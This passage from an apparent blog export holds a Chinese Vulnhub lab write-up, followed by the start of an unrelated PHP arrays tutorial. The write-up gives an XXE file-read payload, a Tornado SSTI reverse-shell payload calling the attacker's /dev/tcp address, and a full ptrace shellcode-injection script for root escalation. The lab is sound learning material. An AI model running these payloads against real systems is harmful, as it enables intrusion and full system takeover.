<p>Capabilities是Linux的一个内核功能。作用：权限管理。该功能将操作系统很多需要特权才能执行的操作（通常只有root和管理员才能执行的系统操作）分成40+个功能。每一个功能都能单独的赋予给程序。当某个程序被赋予了功能，那么即使执行该程序的只是普通用户（不是root，没有suid，不在root组等），也能够使用对应的特权操作。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">setcap</span> cap_net_raw,cap_net_admin=eip /usr/bin/dumpcap</span><br><span class="line"><span class="comment"># 赋予/usr/bin/dumpcap程序抓数据包和抓网络管理相应组件两种能力。</span></span><br></pre></td></tr></table></figure>
<p>参考文档：<a
href="https://linux.die.net/man/7/capabilities">Capabilities</a></p>
<h1 id="渗透">渗透</h1>
<p>攻击机kali：10.0.2.4</p>
<h2
id="主机发现端口扫描端口服务发现">主机发现、端口扫描、端口服务发现</h2>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo arp-scan -l <span class="comment"># 靶机为10.0.2.10</span></span><br><span class="line">sudo nmap -p- 10.0.2.10</span><br><span class="line">sudo nmap -p53,80,9999 -A 10.0.2.10</span><br></pre></td></tr></table></figure>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220408084845.png" /></p>
<p>53端口上是域服务，版本为ISC BIND
9.16.1，并且开启的是53/TCP，有理由认为该主机是域内的DNS服务器，并且53/UDP也是开启着的。输入下面命令验证下：
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo nmap -p53 -sU 10.0.2.10</span><br></pre></td></tr></table></figure></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220408085115.png" /></p>
<p>发现确实如此。ISC BIND 9.16.1
存在着两个远程代码执行漏洞，编号为CVE-2020-8625和CVE-2021-25216（找不到漏洞利用代码）</p>
<p>80端口和9999端口开着的都是http服务。80端口上是apache2，9999端口上是tornado，这是python语言的一个模板，所以后续可能会用到模板注入！</p>
<p>靶机的OS是Ubuntu。</p>
<h2 id="访问http服务">访问http服务</h2>
<p>先访问80端口，页面如下：</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220408085401.png" /></p>
<p>这里注意到一个大写的单词<code>DIG</code>，这是Linux的一个工具，但是使用该工具需要知道靶机的域名，因此接下来就是需要找到关于域名的信息。</p>
<p>查看页面源码的小技巧：</p>
<ol type="1">
<li>一方面关注这个页面到底引用了哪些页面资源，存在哪些路径</li>
<li>另一方面得关注<strong>注释信息</strong></li>
</ol>
<p>查看源码，在最后发现了某一行注释： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">TO DO: Use a GET parameter page_no  to view pages.</span><br></pre></td></tr></table></figure></p>
<p>也就是在该页面上存在着一个参数<code>page_no</code>，以GET方式提交。</p>
<p>又看了一些其他网址，比如主页上的<code>App</code>和<code>Form</code>，<strong>直接点击会出现<code>10.0.2.10/#from.html</code>，把<code>#</code>去掉就可以直接访问了</strong>。但是，发现虽然有很多表单，但是并没有可用的地方，基本都只是做个样子。</p>
<p>那先带入<code>page_no</code>去访问一下，看一下页面会不会发生什么变化。尝试了1，2，3，4之后发现变化都一样，多了一句话<code>Oh Man !! Isn't is right to go a little deep inside?</code>，因此用burp来跑，后面肯定还有变化。结果发现，当<code>page_no=21</code>时，返回的响应包长度出现了变化。</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220408090450.png" /></p>
<p>直接访问发现页面的话变成了如下： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Okay so you want me to speak something ?  </span><br><span class="line">I am a hacker kid not a dumb hacker. So i created some subdomains to return back on the server whenever i want!!  </span><br><span class="line">Out of my many homes...one such home..one such home for me : hackers.blackhat.local</span><br></pre></td></tr></table></figure></p>
<p>发现了一个域名<code>hackers.blackhat.local</code>，这其实是一个三级域名，<code>blackhat.local</code>也是一个域名。因此，获得了两个域名。</p>
<p>将域名添加到<code>/etc/hosts</code>。</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220408091613.png" /></p>
<p>然后直接用浏览器访问，发现<code>hackers.blackhat.local</code>页面和最开始的界面一样，而<code>blackhat.local</code>没有权限访问。</p>
<p>接下来访问9999端口，发现是一个登录界面</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220408091937.png" /></p>
<p>那两个域名加上9999端口也都是同样的界面，等会测试。</p>
<h2 id="dns域传送漏洞-1">DNS域传送漏洞</h2>
<p>利用<code>DIG</code>配合<code>AXFR</code>协议获取更多的域内信息。
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">dig axfr @10.0.2.10 hackers.blackhat.local <span class="comment"># 失败</span></span><br><span class="line">dig axfr @10.0.2.10 blackhat.local</span><br></pre></td></tr></table></figure></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220408092336.png" /></p>
<p>获得了更多的域名信息： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hackerkid.blackhat.local</span><br><span class="line">ftp.blackhat.local</span><br><span class="line">mail.blackhat.local</span><br><span class="line">hacker.blackhat.local.blackhat.local</span><br><span class="line">www.blackhat.local</span><br></pre></td></tr></table></figure></p>
<p>把这些都写入<code>/etc/hosts</code>然后用浏览器直接访问。</p>
<p>在80端口下，上面5个域名中，第一个域名出现了如下界面</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220408093020.png" /></p>
<p>第五个域名没有权限访问，其他的域名都和原来的界面一样。</p>
<p>在9999端口下，5个域名访问的和之前9999端口的界面一样。</p>
<p>填写表单，抓取<code>hackerkid.blackhat.local:80</code>数据包看一下</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220408093729.png" /></p>
<p>发现了两点：</p>
<ol type="1">
<li>这个表单是XML提交的</li>
<li>无论我们在<code>&lt;email&gt;</code>标签内提交什么内容，都会被原封不动的返回回来<code>Sorry, hdfzzf@gmail.com is not available !!!</code></li>
</ol>
<p>先分析第二点，不论我们输入什么内容，服务端都会原封不动得返回给我们，这是三种漏洞的特征：</p>
<ol type="1">
<li>XSS漏洞</li>
<li>XXE漏洞</li>
<li>SSTI漏洞</li>
</ol>
<p>又因为这里的表单是XML，所以怀疑这里存在着XXE漏洞。</p>
<h2 id="xxe漏洞">XXE漏洞</h2>
<p>先验证以下是否存在XXE漏洞，抓数据包修改，然后发送</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220408100434.png" /></p>
<p>发现确实返回了<code>/etc/passwd</code>中的内容，说明确实存在XXE漏洞。寻找跟<code>/bin/bash</code>有关的账号：
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">saket:x:1000:1000:Ubuntu,,,:/home/saket:/bin/bash</span><br></pre></td></tr></table></figure></p>
<p>然后利用该漏洞读取文件内容： <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">/home/saket/.bashrc <span class="comment"># bash配置信息</span></span><br><span class="line">/home/saket/id_rsa <span class="comment"># 私钥</span></span><br><span class="line">...</span><br></pre></td></tr></table></figure></p>
<p>但是发现什么内容都读取不出来，这时候文件可能存在内容，但是别限制不允许明文输出，于是使用
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php://filter/convert.base64-encode/resource=/home/saket/.bashrc</span><br></pre></td></tr></table></figure></p>
<p>将得到的内容解码发现了</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220408101522.png" /></p>
<p>首先猜测这是哪里的密码，因为这台靶机没有开22端口，所以不存在ssh连接。忽然想到，刚刚9999端口存在登陆界面，因此去那里尝试一下。</p>
<p>发现用下面的信息登录不成功。 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username: admin</span><br><span class="line">password: Saket!#$%@!!</span><br></pre></td></tr></table></figure></p>
<p>但是配置文件中的信息不太可能是假的，那就尝试将用下面信息登录（<code>/bin/bash</code>中有saket这个账号），发现居然成功了。
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username: saket</span><br><span class="line">password: Saket!#$%@!!</span><br></pre></td></tr></table></figure></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220408102116.png" /></p>
<p>从上图中的语句中分析，可能我们需要传入一个参数<code>name</code>，当然也可以通过参数爆破，理论上是可行的，不过该靶机不建议爆破，因此先尝试一下。</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220408103126.png" /></p>
<p>因此，这里可能<code>name</code>可能存在着某种注入漏洞。经过测试，发现无论我们在后面加入什么值，都会原封不动的返回。根据之前的描述，共有三种情况，但是XSS和XXE不太可能出现在url中，因此猜测可能存在SSTI。并且最开始收集的信息中也显示9999端口上是tornado模板，所以SSTI的可能性很大，并且模板引擎为tornado。</p>
<h2 id="ssti漏洞-get-shell">SSTI漏洞 Get shell</h2>
<p>模板注入通杀payload： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#123;1+abcxyz&#125;&#125;$&#123;1+abcxyz&#125;&lt;%1+abcxyz%&gt;[abcxyz]</span><br></pre></td></tr></table></figure></p>
<p>如果存在报错，基本说明服务端存在SSTI。abcxyz尽量选择无规则的字符，这样可以保证服务端没有定义过该变量名。此时，服务端引用该变量名就会报错，从而判断可能存在模板注入。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$&#123;7*7&#125;,&#123;&#123;7*7&#125;&#125;</span><br></pre></td></tr></table></figure>
<p>看一下哪一个被执行了，从而可以判断模板引擎和语言。前者表示的PHP类模板，而后者表示python类模板。Java模板不多。</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220408103754.png" /></p>
<p>如果是python，可以利用下面代码进行反弹shell（kali先开启监听）
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;% <span class="keyword">import</span> os %&#125;&#123;&#123;os.system(<span class="string">&#x27;bash -c &quot;bash -i &gt;&amp; /dev/tcp/10.0.2.4/3333 0&gt;&amp;1&quot;&#x27;</span>)&#125;&#125;</span><br></pre></td></tr></table></figure></p>
<p>如果报错了，需要对上述payload进行一些编码，比如url编码（花括号，百分号，引号，斜杠等特殊符号都需要编码）</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">%7B%25%20import%20os%20%25%7D%7B%7Bos.system(%27bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.0.2.4%2F3333%200%3E%261%22%27)%7D%7D</span><br></pre></td></tr></table></figure>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220408103958.png" /></p>
<p>成功突破边界！</p>
<h2 id="权限提升capabilities提权">权限提升——Capabilities提权</h2>
<p>不论是内核漏洞、sudo配置不当以及suid都没找到可以利用的点。也不能像<code>6 EvilBoxOne</code>一样找到拥有写权限的可利用文件。</p>
<p>这里介绍一种新的提权方式： <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">getcap</span> -r / 2&gt;/dev/null</span><br></pre></td></tr></table></figure></p>
<p>上述命令是查看系统上所有程序的功能。<code>-r</code>：递归。如果没有结果，可以先输入<code>getcap</code>查看一下位置在哪，然后
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">/sbin/<span class="built_in">getcap</span> -r / 2&gt;/dev/null</span><br></pre></td></tr></table></figure></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220408105514.png" /></p>
<p><strong>注意<code>cap_sys_ptrace+ep</code>可以用来提权</strong>。也就是上图中的<code>python2.7</code>拥有的功能。参考链接：<a
href="https://blog.pentesteracademy.com/privilege-escalation-by-abusing-sys-ptrace-linux-capability-f6e6ad2a59cc">cap_sys_ptrace提权</a></p>
<p>下载利用脚本，不过链接失效了。下面是脚本的源码： <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># inject.py# The C program provided at the GitHub Link given below can be used as a reference for writing the python script.</span></span><br><span class="line"><span class="comment"># GitHub Link: https://github.com/0x00pf/0x00sec_code/blob/master/mem_inject/infect.c</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> ctypes</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line"><span class="comment"># Macros defined in &lt;sys/ptrace.h&gt;</span></span><br><span class="line"><span class="comment"># https://code.woboq.org/qt5/include/sys/ptrace.h.html</span></span><br><span class="line"></span><br><span class="line">PTRACE_POKETEXT = <span class="number">4</span></span><br><span class="line">PTRACE_GETREGS = <span class="number">12</span></span><br><span class="line">PTRACE_SETREGS = <span class="number">13</span></span><br><span class="line">PTRACE_ATTACH = <span class="number">16</span></span><br><span class="line">PTRACE_DETACH = <span class="number">17</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Structure defined in &lt;sys/user.h&gt;</span></span><br><span class="line"><span class="comment"># https://code.woboq.org/qt5/include/sys/user.h.html#user_regs_struct</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">user_regs_struct</span>(<span class="params">ctypes.Structure</span>):</span></span><br><span class="line">    _fields_ = [</span><br><span class="line">        (<span class="string">&quot;r15&quot;</span>, ctypes.c_ulonglong),</span><br><span class="line">        (<span class="string">&quot;r14&quot;</span>, ctypes.c_ulonglong),</span><br><span class="line">        (<span class="string">&quot;r13&quot;</span>, ctypes.c_ulonglong),</span><br><span class="line">        (<span class="string">&quot;r12&quot;</span>, ctypes.c_ulonglong),</span><br><span class="line">        (<span class="string">&quot;rbp&quot;</span>, ctypes.c_ulonglong),</span><br><span class="line">        (<span class="string">&quot;rbx&quot;</span>, ctypes.c_ulonglong),</span><br><span class="line">        (<span class="string">&quot;r11&quot;</span>, ctypes.c_ulonglong),</span><br><span class="line">        (<span class="string">&quot;r10&quot;</span>, ctypes.c_ulonglong),</span><br><span class="line">        (<span class="string">&quot;r9&quot;</span>, ctypes.c_ulonglong),</span><br><span class="line">        (<span class="string">&quot;r8&quot;</span>, ctypes.c_ulonglong),</span><br><span class="line">        (<span class="string">&quot;rax&quot;</span>, ctypes.c_ulonglong),</span><br><span class="line">        (<span class="string">&quot;rcx&quot;</span>, ctypes.c_ulonglong),</span><br><span class="line">        (<span class="string">&quot;rdx&quot;</span>, ctypes.c_ulonglong),</span><br><span class="line">        (<span class="string">&quot;rsi&quot;</span>, ctypes.c_ulonglong),</span><br><span class="line">        (<span class="string">&quot;rdi&quot;</span>, ctypes.c_ulonglong),</span><br><span class="line">        (<span class="string">&quot;orig_rax&quot;</span>, ctypes.c_ulonglong),</span><br><span class="line">        (<span class="string">&quot;rip&quot;</span>, ctypes.c_ulonglong),</span><br><span class="line">        (<span class="string">&quot;cs&quot;</span>, ctypes.c_ulonglong),</span><br><span class="line">        (<span class="string">&quot;eflags&quot;</span>, ctypes.c_ulonglong),</span><br><span class="line">        (<span class="string">&quot;rsp&quot;</span>, ctypes.c_ulonglong),</span><br><span class="line">        (<span class="string">&quot;ss&quot;</span>, ctypes.c_ulonglong),</span><br><span class="line">        (<span class="string">&quot;fs_base&quot;</span>, ctypes.c_ulonglong),</span><br><span class="line">        (<span class="string">&quot;gs_base&quot;</span>, ctypes.c_ulonglong),</span><br><span class="line">        (<span class="string">&quot;ds&quot;</span>, ctypes.c_ulonglong),</span><br><span class="line">        (<span class="string">&quot;es&quot;</span>, ctypes.c_ulonglong),</span><br><span class="line">        (<span class="string">&quot;fs&quot;</span>, ctypes.c_ulonglong),</span><br><span class="line">        (<span class="string">&quot;gs&quot;</span>, ctypes.c_ulonglong),</span><br><span class="line">    ]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">libc = ctypes.CDLL(<span class="string">&quot;libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line">pid = <span class="built_in">int</span>(sys.argv[<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># Define argument type and respone type.</span></span><br><span class="line">libc.ptrace.argtypes = [ctypes.c_uint64, ctypes.c_uint64, ctypes.c_void_p, ctypes.c_void_p]</span><br><span class="line">libc.ptrace.restype = ctypes.c_uint64</span><br><span class="line"></span><br><span class="line"><span class="comment"># Attach to the process</span></span><br><span class="line">libc.ptrace(PTRACE_ATTACH, pid, <span class="literal">None</span>, <span class="literal">None</span>)</span><br><span class="line">registers = user_regs_struct()</span><br><span class="line"></span><br><span class="line"><span class="comment"># Retrieve the value stored in registers</span></span><br><span class="line">libc.ptrace(PTRACE_GETREGS, pid, <span class="literal">None</span>, ctypes.byref(registers))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Instruction Pointer: &quot;</span> + <span class="built_in">hex</span>(registers.rip))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Injecting Shellcode at: &quot;</span> + <span class="built_in">hex</span>(registers.rip))</span><br><span class="line"></span><br><span class="line"><span class="comment"># Shell code copied from exploit db.</span></span><br><span class="line">shellcode = <span class="string">&quot;\x48\x31\xc0\x48\x31\xd2\x48\x31\xf6\xff\xc6\x6a\x29\x58\x6a\x02\x5f\x0f\x05\x48\x97\x6a\x02\x66\xc7\x44\x24\x02\x15\xe0\x54\x5e\x52\x6a\x31\x58\x6a\x10\x5a\x0f\x05\x5e\x6a\x32\x58\x0f\x05\x6a\x2b\x58\x0f\x05\x48\x97\x6a\x03\x5e\xff\xce\xb0\x21\x0f\x05\x75\xf8\xf7\xe6\x52\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x8d\x3c\x24\xb0\x3b\x0f\x05&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Inject the shellcode into the running process byte by byte.</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">0</span>, <span class="built_in">len</span>(shellcode), <span class="number">4</span>):</span><br><span class="line">    <span class="comment"># Convert the byte to little endian.</span></span><br><span class="line">    shellcode_byte_int = <span class="built_in">int</span>(shellcode[i:<span class="number">4</span> + i].encode(<span class="string">&#x27;hex&#x27;</span>), <span class="number">16</span>)</span><br><span class="line">    shellcode_byte_little_endian = struct.pack(<span class="string">&quot;&lt;I&quot;</span>, shellcode_byte_int).rstrip(<span class="string">&#x27;\x00&#x27;</span>).encode(<span class="string">&#x27;hex&#x27;</span>)</span><br><span class="line">    shellcode_byte = <span class="built_in">int</span>(shellcode_byte_little_endian, <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Inject the byte.</span></span><br><span class="line">    libc.ptrace(PTRACE_POKETEXT, pid, ctypes.c_void_p(registers.rip + i), shellcode_byte)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Shellcode Injected!!&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Modify the instuction pointer</span></span><br><span class="line">registers.rip = registers.rip + <span class="number">2</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Set the registers</span></span><br><span class="line">libc.ptrace(PTRACE_SETREGS, pid, <span class="literal">None</span>, ctypes.byref(registers))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Final Instruction Pointer: &quot;</span> + <span class="built_in">hex</span>(registers.rip))</span><br><span class="line"></span><br><span class="line"><span class="comment"># Detach from the process.</span></span><br><span class="line">libc.ptrace(PTRACE_DETACH, pid, <span class="literal">None</span>, <span class="literal">None</span>)</span><br></pre></td></tr></table></figure></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python2.7 inject.py processID <span class="comment"># 将后门进程注入到对应ID的进程</span></span><br></pre></td></tr></table></figure>
<p>（注意，一定要注入到root用户的进程）</p>
<p>root的进程很多，所以写一个简单的脚本进行批量化尝试：
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> pid <span class="keyword">in</span> `ps -ef|grep root|grep -v <span class="string">&quot;grep&quot;</span>|awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span>`; <span class="keyword">do</span> python2.7 inject.py <span class="variable">$pid</span>; <span class="keyword">done</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 简单说明：ps -ef查看进程情况，一个进程一行，grep root只列出带有root的行（进程），grep -v &quot;grep&quot;不显示带有grep的行（进程），awk &#x27;&#123;print $2&#125;&#x27;显示每一行的第二个位置（从1开始）即PID。</span></span><br></pre></td></tr></table></figure></p>
<p>该后门利用的是5600端口，如果执行完毕之后该端口开启，说明注入成功
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">netstat -tunpla |grep 5600</span><br></pre></td></tr></table></figure></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220408114925.png" /></p>
<p>然后利用nc连接即可提权到root。 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nc 0.0.0.0 5600</span><br></pre></td></tr></table></figure></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220408115600.png" /></p>
<p>成功提权，该靶机到此结束。</p>
<h1 id="总结">总结</h1>
<p>通过对该靶机的渗透学到了：</p>
<ul>
<li>DNS域传送漏洞的利用以及DNS的相关知识</li>
<li>XXE漏洞即XML相关知识</li>
<li>SSTI漏洞的get shell方式</li>
<li>Capabilities技术的提权</li>
</ul>
]]></content>
      <categories>
        <category>内网渗透</category>
      </categories>
      <tags>
        <tag>综合</tag>
        <tag>vulnhub</tag>
        <tag>DNS域传送漏洞</tag>
        <tag>Capabilities提权</tag>
        <tag>SSTI get shell</tag>
        <tag>XXE漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title>7. 数组及其使用</title>
    <url>/2022/11/18/7.%20%E6%95%B0%E7%BB%84%E5%8F%8A%E5%85%B6%E4%BD%BF%E7%94%A8/</url>
    <content><![CDATA[<span id="more"></span>
<h1 id="数组的定义与分类">1. 数组的定义与分类</h1>
<h2 id="定义">1.1. 定义</h2>
<p>数组是键值对的 <strong>有序</strong>
集合（顺序就是加入数组的先后顺序）：</p>
<ul>
<li>键
<ul>
<li>整数</li>
<li>字符串</li>
</ul></li>
<li>值
<ul>
<li>标量
<ul>
<li>整数</li>
<li>浮点</li>
<li>字符串</li>
<li>布尔</li>
</ul></li>
<li>复合
<ul>
<li>数组（此时为多维数组）</li>
<li>对象</li>
</ul></li>
</ul></li>
</ul>
<h2 id="分类">1.2. 分类</h2>
<p>按照 <strong>键名</strong> 分类：</p>
<ul>
<li>索引数组
<ul>
<li>键名默认是从 0 顺序递增的整数；</li>
<li>可自定义键名，如果重复，后面覆盖前面；</li>
<li>如果是小数、或者布尔值则会自动转为整数；</li>
</ul></li>
<li>关联数组
<ul>
<li>键名是字符串；</li>
<li>如果重复，后面覆盖前面；</li>
</ul></li>
</ul>
<h1 id="数组的创建与访问">2. 数组的创建与访问</h1>
<h2 id="创建">2.1. 创建</h2>
<p>创建的方式有以下 3 种：</p>
<ol type="1">
<li>初始化创建；</li>
</ol>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$arr</span> = [<span class="number">12</span>, <span class="number">44</span>, <span class="string">&#x27;abc&#x27;</span>]; <span class="comment"># 等价于 $arr = [0=&gt;12, 1=&gt;44, 2=&gt;&#x27;abc&#x27;];</span></span><br></pre></td></tr></table></figure>
<ol start="2" type="1">
<li>直接给元素赋值创建；</li>
</ol>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$arr</span>[<span class="string">&#x27;name&#x27;</span>] = <span class="string">&#x27;takagi&#x27;</span>;</span><br><span class="line"><span class="variable">$arr</span>[<span class="string">&#x27;age&#x27;</span>] = <span class="number">18</span>;</span><br><span class="line"><span class="variable">$arr</span>[<span class="string">&#x27;city&#x27;</span>]  = <span class="string">&#x27;fuzhou&#x27;</span>;</span><br></pre></td></tr></table></figure>
<ol start="3" type="1">
<li>先声明空数组，然后添加；</li>
</ol>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$arr</span> = [];  <span class="comment"># 与第二种的区别</span></span><br><span class="line"><span class="variable">$arr</span>[<span class="string">&#x27;name&#x27;</span>] = <span class="string">&#x27;takagi&#x27;</span>;</span><br><span class="line"><span class="variable">$arr</span>[<span class="string">&#x27;age&#x27;</span>] = <span class="number">18</span>;</span><br><span class="line"><span class="variable">$arr</span>[<span class="string">&#x27;city&#x27;</span>]  = <span class="string">&#x27;fuzhou&#x27;</span>;</span><br></pre></td></tr></table></figure>
<p>如果不指定键名，则会默认从当前最后一个键名开始递增（索引）：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$arr</span> = [];</span><br><span class="line"><span class="variable">$arr</span>[<span class="number">2</span>] = <span class="string">&#x27;takagi&#x27;</span>;</span><br><span class="line"><span class="variable">$arr</span>[] = <span class="number">18</span>;</span><br><span class="line"><span class="variable">$arr</span>[]  = <span class="string">&#x27;fuzhou&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;&#x27;</span>;</span><br><span class="line">print_r(<span class="variable">$arr</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;/pre&gt;&#x27;</span>;</span><br></pre></td></tr></table></figure>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20221117203615.png" /></p>
<h2 id="访问">2.2. 访问</h2>
<ol type="1">
<li>整体访问；</li>
</ol>
<p>使用 <code>print_r()</code> 函数。</p>
<ol start="2" type="1">
<li>单个访问；</li>
</ol>
<p><code>$arr[key]</code> 即可。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$arr</span> = [];</span><br><span class="line"><span class="variable">$arr</span>[<span class="number">2</span>] = <span class="string">&#x27;takagi&#x27;</span>;</span><br><span class="line"><span class="variable">$arr</span>[] = <span class="number">18</span>;</span><br><span class="line"><span class="variable">$arr</span>[]  = <span class="string">&#x27;fuzhou&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$arr</span>[<span class="number">2</span>];</span><br></pre></td></tr></table></figure>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20221117203744.png" /></p>
<h2 id="数组指针">2.3. 数组指针</h2>
<ol type="1">
<li><code>current()</code> ：获取指针当前位置的元素的值；</li>
<li><code>key()</code> ：获取指针当前元素的键名（索引）；</li>
<li><code>next()</code> ：指针移动到下一个元素；</li>
<li><code>prev()</code> ：指针移动到上一个元素；</li>
<li><code>end()</code> ：指针移动到最后一个元素；</li>
<li><code>reset()</code> ：指针复位到第一个元素；</li>
</ol>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$arr</span> = [<span class="string">&#x27;html&#x27;</span>, <span class="string">&#x27;css&#x27;</span>, <span class="string">&#x27;javascript&#x27;</span>, <span class="string">&#x27;php&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;&#x27;</span>;</span><br><span class="line">print_r(<span class="variable">$arr</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;/pre&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;当前元素是：&#x27;</span>.key(<span class="variable">$arr</span>).<span class="string">&#x27; =&gt; &#x27;</span>.current(<span class="variable">$arr</span>).<span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">next(<span class="variable">$arr</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;当前元素是：&#x27;</span>.key(<span class="variable">$arr</span>).<span class="string">&#x27; =&gt; &#x27;</span>.current(<span class="variable">$arr</span>).<span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">next(<span class="variable">$arr</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;当前元素是：&#x27;</span>.key(<span class="variable">$arr</span>).<span class="string">&#x27; =&gt; &#x27;</span>.current(<span class="variable">$arr</span>).<span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">next(<span class="variable">$arr</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;当前元素是：&#x27;</span>.key(<span class="variable">$arr</span>).<span class="string">&#x27; =&gt; &#x27;</span>.current(<span class="variable">$arr</span>).<span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">prev(<span class="variable">$arr</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;当前元素是：&#x27;</span>.key(<span class="variable">$arr</span>).<span class="string">&#x27; =&gt; &#x27;</span>.current(<span class="variable">$arr</span>).<span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">reset(<span class="variable">$arr</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;当前元素是：&#x27;</span>.key(<span class="variable">$arr</span>).<span class="string">&#x27; =&gt; &#x27;</span>.current(<span class="variable">$arr</span>).<span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">end(<span class="variable">$arr</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;当前元素是：&#x27;</span>.key(<span class="variable">$arr</span>).<span class="string">&#x27; =&gt; &#x27;</span>.current(<span class="variable">$arr</span>).<span 